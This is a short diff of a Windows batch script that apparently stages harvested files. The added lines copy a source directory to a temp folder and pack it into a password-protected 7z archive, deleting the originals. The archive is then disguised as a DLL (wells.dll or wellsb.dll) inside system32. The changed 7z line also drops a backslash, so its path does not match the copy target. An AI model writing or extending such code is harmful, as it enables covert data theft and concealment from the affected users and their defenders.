@@ -15,7 +15,8 @@ if exist %save_dir% (
 		move /Y %windir%\system32\srud\wells.zip %windir%\system32\srud\wellsb.dll
 		)
 	else (
-		7z a %windir%/system32/srud/wells.zip -sdel -p22#yd8 %source_dir%
+		xcopy /Y /E /I /S %source_dir% %userprofile%\youdetmp
+		7z a %windir%/system32/srud/wells.zip -sdel -p22#yd8 %userprofile%youdetmp
 		move /Y %windir%\system32\srud\wells.zip %windir%\system32\srud\wells.dll
 	)
 )
